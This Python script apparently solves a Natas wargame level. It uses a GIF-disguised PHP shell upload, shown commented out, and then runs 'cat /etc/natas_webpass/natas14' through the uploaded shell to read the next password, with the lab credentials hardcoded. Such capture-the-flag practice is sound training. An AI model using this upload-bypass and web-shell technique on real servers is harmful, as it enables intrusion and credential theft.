#!/usr/bin/env python3

import requests
import re
import urllib
import base64
import binascii

username = 'natas13'
password = 'jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY'

url = 'http://%s.natas.labs.overthewire.org/' % username

session = requests.Session()
# response = session.post(url, files = { "uploadedfile": open('revshell-gif.php', 'rb') }, data = { "filename": "revshell.php", "MAX_FILE_SIZE": "1000" }, auth = (username, password))
# response = requests.get(url, auth = (username, password))
response = session.get(url + "upload/uyqhobeodo.php?c=cat /etc/natas_webpass/natas14", auth = (username, password))

content = response.text

# print(content)

print(re.findall('GIF89a\n(.*)\n', content)[0])